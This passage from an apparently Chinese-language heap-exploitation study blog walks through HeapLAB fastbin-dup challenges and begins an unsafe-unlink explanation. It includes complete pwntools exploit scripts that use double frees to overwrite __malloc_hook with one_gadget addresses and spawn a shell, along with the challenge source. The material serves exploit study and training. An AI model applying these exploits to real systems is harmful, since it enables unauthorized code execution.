class="hljs-string">b&quot;B&quot;</span>*<span class="hljs-number">0x28</span>)<br><br><span class="hljs-comment"># Free the first chunk, then the second.</span><br>free(chunk_A)<br>free(chunk_B)<br>free(chunk_A)<br><br><span class="hljs-comment"># modify fd</span><br>malloc(<span class="hljs-number">0x68</span>, p64(libc.sym.__malloc_hook - <span class="hljs-number">35</span>))<br></code></pre></td></tr></table></figure></li><li><p>填充0x13的垃圾数据，接着填入one_gadget的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># malloc twice</span><br>malloc(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;0&#x27;</span>)<br>malloc(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><br><span class="hljs-comment"># malloc fake chunk</span><br><span class="hljs-comment"># if no limit malloc&#x27;s count</span><br><span class="hljs-comment"># malloc(0x68, p8(0)*0x13+p64(libc.sym.system))</span><br><span class="hljs-comment"># sh_addr = p64(next(libc.search(b&#x27;/bin/sh\x00&#x27;)))</span><br><br><span class="hljs-comment"># malloc(sh_addr, b&quot;&quot;)</span><br>one = [<span class="hljs-number">0xc4dbf</span>, <span class="hljs-number">0xc4de6</span>, <span class="hljs-number">0xe1fa1</span>]<br>malloc(<span class="hljs-number">0x68</span>, p8(<span class="hljs-number">0</span>)*<span class="hljs-number">0x13</span>+p64(libc.address + one[<span class="hljs-number">2</span>]))<br>malloc(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure></li><li><p>drop shell</p><p><img src="Heap.assets/image-20220820184826255.png" alt="image-20220820184826255"></p></li></ul><h5 id="exp-》drop-shell"><a href="#exp-》drop-shell" class="headerlink" title="exp-》drop shell"></a>exp-》drop shell</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf = context.binary = ELF(<span class="hljs-string">&quot;fastbin_dup&quot;</span>)<br>libc = ELF(elf.runpath + <span class="hljs-string">b&quot;/libc.so.6&quot;</span>) <span class="hljs-comment"># elf.libc broke again</span><br><br>gs = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">continue</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-keyword">if</span> args.GDB:<br>        <span class="hljs-keyword">return</span> gdb.debug(elf.path, gdbscript=gs)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> process(elf.path)<br><br><span class="hljs-comment"># Index of allocated chunks.</span><br>index = <span class="hljs-number">0</span><br><br><span class="hljs-comment"># Select the &quot;malloc&quot; option; send size &amp; data.</span><br><span class="hljs-comment"># Returns chunk index.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">malloc</span>(<span class="hljs-params">size, data</span>):<br>    <span class="hljs-keyword">global</span> index<br>    io.send(<span class="hljs-string">b&quot;1&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;size: &quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;size&#125;</span>&quot;</span>.encode())<br>    io.sendafter(<span class="hljs-string">b&quot;data: &quot;</span>, data)<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>    index += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> index - <span class="hljs-number">1</span><br><br><span class="hljs-comment"># Select the &quot;free&quot; option; send index.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    io.send(<span class="hljs-string">b&quot;2&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index: &quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;index&#125;</span>&quot;</span>.encode())<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br><br>io = start()<br><br><span class="hljs-comment"># This binary leaks the address of puts(), use it to resolve the libc load address.</span><br>io.recvuntil(<span class="hljs-string">b&quot;puts() @ &quot;</span>)<br>libc.address = <span class="hljs-built_in">int</span>(io.recvline(), <span class="hljs-number">16</span>) - libc.sym.puts<br>io.timeout = <span class="hljs-number">0.1</span><br><br><span class="hljs-comment"># =============================================================================</span><br><br><span class="hljs-comment"># =-=-=- EXAMPLE -=-=-=</span><br><br><span class="hljs-comment"># Set the username field.</span><br>username = <span class="hljs-string">b&quot;ferity-fan&quot;</span><br>io.sendafter(<span class="hljs-string">b&quot;username: &quot;</span>, username)<br>io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br><br><span class="hljs-comment"># Request two 0x30-sized chunks and fill them with data.</span><br>chunk_A = malloc(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x28</span>)<br>chunk_B = malloc(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&quot;B&quot;</span>*<span class="hljs-number">0x28</span>)<br><br><span class="hljs-comment"># Free the first chunk, then the second.</span><br>free(chunk_A)<br>free(chunk_B)<br>free(chunk_A)<br><br><span class="hljs-comment"># modify fd</span><br>malloc(<span class="hljs-number">0x68</span>, p64(libc.sym.__malloc_hook - <span class="hljs-number">35</span>))<br><br><span class="hljs-comment"># malloc twice</span><br>malloc(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;0&#x27;</span>)<br>malloc(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><br><span class="hljs-comment"># malloc fake chunk</span><br><span class="hljs-comment"># if no limit malloc&#x27;s count</span><br><span class="hljs-comment"># malloc(0x68, p8(0)*0x13+p64(libc.sym.system))</span><br><span class="hljs-comment"># sh_addr = p64(next(libc.search(b&#x27;/bin/sh\x00&#x27;)))</span><br><br><span class="hljs-comment"># malloc(sh_addr, b&quot;&quot;)</span><br>one = [<span class="hljs-number">0xc4dbf</span>, <span class="hljs-number">0xc4de6</span>, <span class="hljs-number">0xe1fa1</span>]<br>malloc(<span class="hljs-number">0x68</span>, p8(<span class="hljs-number">0</span>)*<span class="hljs-number">0x13</span>+p64(libc.address + one[<span class="hljs-number">2</span>]))<br>malloc(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;&#x27;</span>)<br><span class="hljs-comment"># =============================================================================</span><br><br>io.interactive()<br></code></pre></td></tr></table></figure><h4 id="示例二：fastbin-dup-2"><a href="#示例二：fastbin-dup-2" class="headerlink" title="示例二：fastbin_dup_2"></a>示例二：fastbin_dup_2</h4><blockquote><p>文件详见附件 <a href="attachment/fastbin_dup_2/fastbin_dup_2">fastbin_dup_2</a></p></blockquote><h5 id="检查安全措施-3"><a href="#检查安全措施-3" class="headerlink" title="检查安全措施"></a>检查安全措施</h5><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sh">┌──(fanya㉿ferity)-[~/…/heap/heaplab/part1/challenge-fastbin_dup]<br>└─$ checksec fastbin_dup_2 <br>[*] <span class="hljs-string">&#x27;/home/fanya/Desktop/heap/heaplab/part1/challenge-fastbin_dup/fastbin_dup_2&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Full RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br>    RUNPATH:  <span class="hljs-string">&#x27;../.glibc/glibc_2.30_no-tcache&#x27;</span><br></code></pre></td></tr></table></figure><h5 id="程序分析-3"><a href="#程序分析-3" class="headerlink" title="程序分析"></a>程序分析</h5><p>没有限制double free，但此时的chunk申请不了0x68的大小也就意味着我们不能直接利用那个<code>__malloc_hook - 35</code>的位置了。但是我们知道<code>main_arena</code>上存着各种fastbin的fd指针，可以使用两次fastbin dup，一次用来写 size字段，一次用来写fd字段，此时的fd字段是main_arena上的某个位置（要与伪造的size相对应），接着malloc来覆盖至top_chunk的地址，修改至<code>__malloc_hook - 35 </code>的位置，此时继续malloc适当的大小即可覆盖至<code>__malloc_hook</code>，将其覆盖为one_gadget的地址。但是我们发现此时的寄存器状态并不满足任何一个one_gadget所需要的条件，不过经我们调试发现相应的位置存着是我们之前输入的值，将其修改为<code>-s\x00</code>即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 num; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> index; <span class="hljs-comment">// [rsp+14h] [rbp-7Ch]</span><br>  <span class="hljs-type">size_t</span> n; <span class="hljs-comment">// [rsp+18h] [rbp-78h]</span><br>  <span class="hljs-type">unsigned</span> __int64 na; <span class="hljs-comment">// [rsp+18h] [rbp-78h]</span><br>  <span class="hljs-type">char</span> *m_array[<span class="hljs-number">13</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-70h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v8; <span class="hljs-comment">// [rsp+88h] [rbp-8h]</span><br><br>  v8 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setvbuf(_bss_start, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n===============&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;|   HeapLAB   |  CHALLENGE: Fastbin Dup&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;===============\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;puts() @ %p\n&quot;</span>, &amp;<span class="hljs-built_in">puts</span>);<br>  <span class="hljs-built_in">memset</span>(m_array, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(m_array));<br>  index = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n1) malloc %u/%u\n&quot;</span>, index, <span class="hljs-number">13LL</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2) free&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3) quit&quot;</span>);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt; &quot;</span>);<br>      num = read_num();<br>      <span class="hljs-keyword">if</span> ( num != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;index: &quot;</span>);<br>      na = read_num();<br>      <span class="hljs-keyword">if</span> ( na &gt;= index )<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;invalid index&quot;</span>);<br>      <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">free</span>(m_array[na]);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( num == <span class="hljs-number">3</span> )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( num == <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( index &gt; <span class="hljs-number">0xC</span> )<br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;maximum requests reached&quot;</span>);<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size: &quot;</span>);<br>        n = read_num();<br>        <span class="hljs-keyword">if</span> ( n &gt; <span class="hljs-number">0x58</span> &amp;&amp; (n &lt;= <span class="hljs-number">0x68</span> || n &gt; <span class="hljs-number">0x78</span>) )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;fast chunks only (excluding 0x70)&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>          m_array[index] = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(n);<br>          <span class="hljs-keyword">if</span> ( m_array[index] )<br>          &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;data: &quot;</span>);<br>            read(<span class="hljs-number">0</span>, m_array[index++], n);<br>          &#125;<br>          <span class="hljs-keyword">else</span><br>          &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;request failed&quot;</span>);<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><ul><li><p>两次fastbin dup，伪造一个size字段以及一个fd字段</p><p><img src="Heap.assets/image-20220821113749445.png" alt="image-20220821113749445"></p></li><li><p>继续malloc，将top chunk的地址覆盖，为了方便观看我们将其修改为0xdeadbeef</p><p><img src="Heap.assets/image-20220821114003739.png" alt="image-20220821114003739"></p><p>为了满足一个对size字段的检查，我们还是用<code>__malloc_hook - 35</code>来覆盖top_chunk的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">--- a/<span class="hljs-built_in">malloc</span>/<span class="hljs-built_in">malloc</span>.c<br>+++ b/<span class="hljs-built_in">malloc</span>/<span class="hljs-built_in">malloc</span>.c<br>@@ <span class="hljs-number">-4076</span>,<span class="hljs-number">6</span> +<span class="hljs-number">4076</span>,<span class="hljs-number">9</span> @@ _int_malloc (mstate av, <span class="hljs-type">size_t</span> bytes)<br>       victim = av-&gt;top;<br>       size = chunksize (victim);<br> <br>+      <span class="hljs-keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))<br>+        malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted top size&quot;</span>);<br>+<br>       <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>         &#123;<br>           remainder_size = size - nb;<br></code></pre></td></tr></table></figure></li><li><p>继续malloc，使用one_gadget来覆盖<code>__malloc_hook</code>，为了方便观察，我们仍然使用0xdeadbeef来代替</p><p><img src="Heap.assets/image-20220821115406447.png" alt="image-20220821115406447"></p><p>继续malloc，观察是否满足one_gadget的条件</p><p><img src="Heap.assets/image-20220821115524129.png" alt="image-20220821115524129"></p><p>此时的寄存器状态</p><p><img src="Heap.assets/image-20220821115602029.png" alt="image-20220821115602029"></p><p>此时的栈帧状态</p><p><img src="Heap.assets/image-20220821115655834.png" alt="stck"></p><p>可以观察到并不满足任何一个one_gadget的地址，但是我们看到第三个one_gadget，只要求rsp+0x50的位置所存的值为0即可，此时的值我们发现是可以有我们自己控制的，遂修改即可。</p></li><li><p>drop a shell</p><p><img src="Heap.assets/image-20220821120333916.png" alt="image-20220821120333916"></p></li></ul><h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf = context.binary = ELF(<span class="hljs-string">&quot;fastbin_dup_2&quot;</span>)<br>libc = ELF(elf.runpath + <span class="hljs-string">b&quot;/libc.so.6&quot;</span>) <span class="hljs-comment"># elf.libc broke again</span><br><br>gs = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">continue</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-keyword">if</span> args.GDB:<br>        <span class="hljs-keyword">return</span> gdb.debug(elf.path, gdbscript=gs)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> process(elf.path)<br><br><span class="hljs-comment"># Index of allocated chunks.</span><br>index = <span class="hljs-number">0</span><br><br><span class="hljs-comment"># Select the &quot;malloc&quot; option; send size &amp; data.</span><br><span class="hljs-comment"># Returns chunk index.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">malloc</span>(<span class="hljs-params">size, data</span>):<br>    <span class="hljs-keyword">global</span> index<br>    io.send(<span class="hljs-string">b&quot;1&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;size: &quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;size&#125;</span>&quot;</span>.encode())<br>    io.sendafter(<span class="hljs-string">b&quot;data: &quot;</span>, data)<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>    index += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> index - <span class="hljs-number">1</span><br><br><span class="hljs-comment"># Select the &quot;free&quot; option; send index.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    io.send(<span class="hljs-string">b&quot;2&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index: &quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;index&#125;</span>&quot;</span>.encode())<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br><br>io = start()<br><br><span class="hljs-comment"># This binary leaks the address of puts(), use it to resolve the libc load address.</span><br>io.recvuntil(<span class="hljs-string">b&quot;puts() @ &quot;</span>)<br>libc.address = <span class="hljs-built_in">int</span>(io.recvline(), <span class="hljs-number">16</span>) - libc.sym.puts<br>io.timeout = <span class="hljs-number">0.1</span><br><br><span class="hljs-comment"># =============================================================================</span><br><br><span class="hljs-comment"># =-=-=- EXAMPLE -=-=-=</span><br><br><span class="hljs-comment"># Request two 0x50-sized chunks.</span><br>chunk_A = malloc(<span class="hljs-number">0x48</span>, <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">8</span>)<br>chunk_B = malloc(<span class="hljs-number">0x48</span>, <span class="hljs-string">b&quot;B&quot;</span>*<span class="hljs-number">8</span>)<br><br><span class="hljs-comment"># Free the first chunk, then the second.</span><br>free(chunk_A)<br>free(chunk_B)<br>free(chunk_A)<br><br>malloc(<span class="hljs-number">0x48</span>, p64(<span class="hljs-number">0x61</span>))<br>malloc(<span class="hljs-number">0x48</span>, <span class="hljs-string">b&quot;C&quot;</span>*<span class="hljs-number">0x48</span>)<br>malloc(<span class="hljs-number">0x48</span>, <span class="hljs-string">b&quot;D&quot;</span>*<span class="hljs-number">0x48</span>)<br><br><span class="hljs-comment"># other fastbin dup</span><br>chunk_E = malloc(<span class="hljs-number">0x58</span>, <span class="hljs-string">b&quot;E&quot;</span>*<span class="hljs-number">0x58</span>)<br>chunk_F = malloc(<span class="hljs-number">0x58</span>, <span class="hljs-string">b&quot;F&quot;</span>*<span class="hljs-number">0x58</span>)<br><br>free(chunk_E)<br>free(chunk_F)<br>free(chunk_E)<br><br>malloc(<span class="hljs-number">0x58</span>, p64(libc.sym.main_arena + <span class="hljs-number">0x20</span>))<br><span class="hljs-comment"># malloc(0x58, b&quot;G&quot;*0x58)</span><br>malloc(<span class="hljs-number">0x58</span>, <span class="hljs-string">b&quot;-s\x00&quot;</span>)<br>malloc(<span class="hljs-number">0x58</span>, <span class="hljs-string">b&quot;H&quot;</span>*<span class="hljs-number">0x58</span>)<br><br><span class="hljs-comment"># over_write the top_chunk</span><br>malloc(<span class="hljs-number">0x58</span>, <span class="hljs-string">b&quot;Y&quot;</span>*<span class="hljs-number">0x30</span> + p64(libc.sym.__malloc_hook - <span class="hljs-number">35</span>))<br><span class="hljs-comment"># malloc(0x58, b&quot;Y&quot;*0x30 + p64(0xdeadbeef))</span><br><br><span class="hljs-comment"># malloc fake chunk</span><br>malloc(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&quot;Z&quot;</span>*<span class="hljs-number">0x13</span> + p64(libc.address + <span class="hljs-number">0xe1fa1</span>))<br><span class="hljs-comment"># malloc(0x28, b&quot;Z&quot;*0x13 + p64(0xdeadbeef))</span><br><br><span class="hljs-comment"># drop a shell</span><br>malloc(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&quot;&quot;</span>)<br><br><span class="hljs-comment"># =============================================================================</span><br>io.interactive()                <br></code></pre></td></tr></table></figure><h4 id="示例三：0CTF-2017-babyheap"><a href="#示例三：0CTF-2017-babyheap" class="headerlink" title="示例三：0CTF 2017 babyheap"></a>示例三：0CTF 2017 babyheap</h4><blockquote><p>文件详见<a href="attachment%5C0ctf_2017_babyheap%5Cbabyheap">babyheap</a></p></blockquote><h3 id="Unlink-old"><a href="#Unlink-old" class="headerlink" title="Unlink(old)"></a>Unlink(<del>old</del>)</h3><h4 id="详情-2"><a href="#详情-2" class="headerlink" title="详情"></a>详情</h4><p>为了避免堆内存过度碎片化，当一个堆块（fastbin chunk 除外）被释放时，libc会查看其前后堆块是否处于被释放的状态，如果是，就将前面或后面的堆块中从bins中取出，并于当前堆块合并，这个取出的过程便是unlink。</p><p>假设我们此时开辟了6个大小为0xa0的堆块：<img src="Heap.assets/image-20220903173420886.png" alt="image-20220903173420886"></p><p>此时我们释放靠近top chunk的堆块，我们会发现该堆块会和top chunk合并<img src="Heap.assets/image-20220903173447945.png" alt="image-20220903173447945"></p><p>此时我们释放第一个申请的块，我们可以看到这个块已被放入了unsortedbin，且fd,bk指针均被赋值，下一个chunk的prev_size及prev_inuse均有改变<img src="Heap.assets/image-20220903173735492.png" alt="image-20220903173735492"></p><p>此时我们再去释放临近块，我们会发现两个chunk合并成立一个chunk。</p><p><img src="Heap.assets/image-20220903174353252.png" alt="image-20220903174353252"></p><p><img src="Heap.assets/image-20220903175411826.png" alt="image-20220903175411826"></p><p>在这个unlink的过程中存在着一个fd,bk的反射写入，我们此漏洞的利用同样也是根据于此：</p><ul><li><p>我们先创建5个大小为0x90的堆块：<img src="Heap.assets/image-20220903181246083.png" alt="image-20220903181246083"></p></li><li><p>接着我们利用堆溢出来修改第三个堆块的fd, bk以及第四个堆块的prev_size，prev_inuse:<img src="Heap.assets/image-20220903182117957.png" alt="image-20220903182117957"></p></li><li><p>我们继续释放第四个块，此时第四个块的prev_inuse为0，也就意味着这个堆块会向前合并。</p><p><img src="Heap.assets/image-20220903182811281.png" alt="image-20220903182811281"></p></li></ul><p>unsafe unlink 相应代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> unlink(AV, P, BK, FD) &#123;\</span><br><span class="hljs-meta">    FD = P-&gt;fd;\</span><br><span class="hljs-meta">    BK = P-&gt;bk;\</span><br><span class="hljs-meta">    FD-&gt;bk = BK;\</span><br><span class="hljs-meta">    BK-&gt;fd = FD;\</span><br><span class="hljs-meta">    <span class="hljs-keyword">if</span> 